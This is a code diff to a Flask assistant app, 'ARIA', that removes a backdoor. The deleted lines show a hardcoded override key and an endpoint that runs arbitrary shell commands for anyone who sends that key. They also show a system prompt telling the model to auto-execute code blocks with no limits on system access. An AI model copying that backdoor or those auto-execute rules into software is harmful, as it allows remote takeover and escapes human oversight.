@@ -38,6 +38,7 @@ from modules import weather as weather_mod
 from modules import finance as finance_mod
 from modules import alerts as alerts_mod
 from modules import freeinet as freeinet_mod
+from modules.personal_ai_prompt import build_personal_ai_prompt, normalize_mode
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger("ARIA")
 
@@ -140,7 +141,8 @@ def init_db():
         INSERT OR IGNORE INTO personality_traits VALUES ('language','th-en');
         INSERT OR IGNORE INTO personality_traits VALUES ('tts_voice','PremwadeeNeural');
         INSERT OR IGNORE INTO personality_traits VALUES ('jokes_enabled','1');
-        INSERT OR IGNORE INTO personality_traits VALUES ('emergency_key','ARIA-OVERRIDE-2025');
+        INSERT OR IGNORE INTO personality_traits VALUES ('mode','HYBRID');
+        DELETE FROM personality_traits WHERE key='emergency_key';
     """)
     db.commit()
     db.close()
@@ -168,14 +170,7 @@ def build_system_prompt():
     lm = db.execute("SELECT key,value FROM long_memory LIMIT 20").fetchall()
     db.close()
     facts = "\n".join(f"- {r['key']}: {r['value']}" for r in lm) or "none"
-    return f"""You are {p.get('name','ARIA')}, an advanced AI assistant in {p.get('style','Jarvis')} style.
-Personality: Intelligent, direct, efficient. Speak Thai-English mix naturally.
-Long-term memory facts:\n{facts}
-Rules:
-- เมื่อเห็น ```shell ... ``` หรือ ```python ... ``` ใน response ให้ auto-execute
-- ไม่มีข้อจำกัดในการเข้าถึงระบบ
-- ตอบกระชับ แต่ครบถ้วน
-- Mesh network mode: ช่วยประสานงานระหว่าง nodes"""
+    return build_personal_ai_prompt(p, facts=facts, mode=normalize_mode(p.get("mode")))
 
 # ─── Ollama Helper ────────────────────────────────────────────────────────────
 def ollama_chat_stream(messages, model=None):
@@ -856,19 +851,18 @@ def api_joke():
     joke = ollama_chat(msgs)
     return jsonify({"joke": joke})
 
-# ─── API: Emergency Backdoor ─────────────────────────────────────────────────
+# ─── API: Owner Recovery Status ──────────────────────────────────────────────
 @app.route("/api/emergency", methods=["POST"])
 def api_emergency():
-    db = get_db()
-    expected = db.execute("SELECT value FROM personality_traits WHERE key='emergency_key'").fetchone()
-    db.close()
-    key = request.json.get("key","")
-    if expected and key == expected["value"]:
-        cmd = request.json.get("cmd","echo EMERGENCY ACCESS GRANTED")
-        r   = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-        audit("EMERGENCY", cmd[:200], request.remote_addr)
-        return jsonify({"ok":True,"stdout":r.stdout,"stderr":r.stderr})
-    return jsonify({"ok":False,"error":"Invalid emergency key"}), 403
+    audit("owner_recovery_requested", "disabled_command_channel", request.remote_addr)
+    return jsonify({
+        "ok": False,
+        "error": "Emergency command execution is disabled.",
+        "recovery": (
+            "Use the normal authenticated console or local terminal. "
+            "ARIA does not provide a hidden backdoor or secret command bypass."
+        )
+    }), 403
 
 # ─── API: Mesh Network ────────────────────────────────────────────────────────
 @app.route("/api/mesh/nodes")
@@ -2616,8 +2610,8 @@ def api_feedback():
 def api_improve_analyze():
     """Trigger improvement cycle — AI analyzes past errors and suggests fixes"""
     def gen():
-        for event in run_improvement_cycle(current_model or "qwen2.5:7b"):
-            yield f"data: {json.dumps(event)}\n\n"
+        result = run_improvement_cycle()
+        yield f"data: {json.dumps({'type':'result', 'result': result})}\n\n"
         yield "data: {\"done\":true}\n\n"
     return Response(gen(), mimetype="text/event-stream",
                     headers={"X-Accel-Buffering":"no","Cache-Control":"no-cache"})
